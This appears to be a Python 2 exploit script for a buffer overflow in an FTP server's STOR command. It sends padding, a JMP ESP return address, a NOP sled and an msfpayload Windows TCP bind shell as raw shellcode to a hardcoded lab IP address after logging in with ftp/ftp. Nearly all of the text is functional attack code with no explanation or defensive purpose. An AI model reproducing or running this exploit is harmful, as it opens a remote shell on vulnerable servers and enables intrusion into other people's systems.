#!/bin/python
import socket, sys
# non-magic numbers (conveniently configurable shit)
garbage_needed = 965
sled_size = 20
garbage = '\x41' * garbage_needed
nopsled = '\x90' * sled_size
#buff = '\x41' * 965 + jmp_esp + nop_sled * 8 + payload
# 7E 42 93 53 FFE4 JMP ESP
jmp_esp = "\x53\x93\x42\x7e"
# windows tcp bind shell payload from msfpayload
# to use: buffer = '\x41' * 965 + jmp_esp + nop_sled * 8 + payload
payload = "\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x46\xa0\x3d\x9f\x83\xeb\xfc\xe2\xf4\xba\xca\xd6\xd2\xae\x59\xc2\x60\xb9\xc0\xb6\xf3\x62\x84\xb6\xda\x7a\x2b\x41\x9a\x3e\xa1\xd2\x14\x09\xb8\xb6\xc0\x66\xa1\xd6\xd6\xcd\x94\xb6\x9e\xa8\x91\xfd\x06\xea\x24\xfd\xeb\x41\x61\xf7\x92\x47\x62\xd6\x6b\x7d\xf4\x19\xb7\x33\x45\xb6\xc0\x62\xa1\xd6\xf9\xcd\xac\x76\x14\x19\xbc\x3c\x74\x45\x8c\xb6\x16\x2a\x84\x21\xfe\x85\x91\xe6\xfb\xcd\xe3\x0d\x14\x06\xac\xb6\xef\x5a\x0d\xb6\xdf\x4e\xfe\x55\x11\x08\xae\xd1\xcf\xb9\x76\x5b\xcc\x20\xc8\x0e\xad\x2e\xd7\x4e\xad\x19\xf4\xc2\x4f\x2e\x6b\xd0\x63\x7d\xf0\xc2\x49\x19\x29\xd8\xf9\xc7\x4d\x35\x9d\x13\xca\x3f\x60\x96\xc8\xe4\x96\xb3\x0d\x6a\x60\x90\xf3\x6e\xcc\x15\xf3\x7e\xcc\x05\xf3\xc2\x4f\x20\xc8\x2c\xc3\x20\xf3\xb4\x7e\xd3\xc8\x99\x85\x36\x67\x6a\x60\x90\xca\x2d\xce\x13\x5f\xed\xf7\xe2\x0d\x13\x76\x11\x5f\xeb\xcc\x13\x5f\xed\xf7\xa3\xe9\xbb\xd6\x11\x5f\xeb\xcf\x12\xf4\x68\x60\x96\x33\x55\x78\x3f\x66\x44\xc8\xb9\x76\x68\x60\x96\xc6\x57\xfb\x20\xc8\x5e\xf2\xcf\x45\x57\xcf\x1f\x89\xf1\x16\xa1\xca\x79\x16\xa4\x91\xfd\x6c\xec\x5e\x7f\xb2\xb8\xe2\x11\x0c\xcb\xda\x05\x34\xed\x0b\x55\xed\xb8\x13\x2b\x60\x33\xe4\xc2\x49\x1d\xf7\x6f\xce\x17\xf1\x57\x9e\x17\xf1\x68\xce\xb9\x70\x55\x32\x9f\xa5\xf3\xcc\xb9\x76\x57\x60\xb9\x97\xc2\x4f\xcd\xf7\xc1\x1c\x82\xc4\xc2\x49\x14\x5f\xed\xf7\xb6\x2a\x39\xc0\x15\x5f\xeb\x60\x96\xa0\x3d\x9f"
buff = '\x41' * 964 + jmp_esp + nopsled + payload + '\x42' * 400
if (len(sys.argv) != 1) & (len(sys.argv) != 2):
	print "\n\nUsage : python exploit_pattern.py <pattern>"
	print "For extra verbosity, use: python exploit_pattern.py -v"
	print "Quitting...\n\n"
	exit(1);
verbose = 0
if len(sys.argv) == 2:
	verbose = 1
# FTP commands to fuzz
cmds = ["STOR"]
# Run the fuzzing loop
if verbose:
	print "[*] done building buffer. Just need to connect now.."
for command in cmds:
	if verbose:
		print "\n[*] Sending command " + command + " with " + str(len(buff)) + " bytes."
		print "\n[*] command is: " + command + " " + buff
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(('192.168.194.130', 21)) # Hardcoded IP address
	s.recv(1024)
	s.send('USER ftp\r\n')
	s.recv(1024)
	s.send('PASS ftp\r\n')
	s.recv(1024)
	s.send(command + ' ' + buff + '\r\n')
	s.recv(1024)
	s.send('QUIT\r\n')
	s.close()
# EOF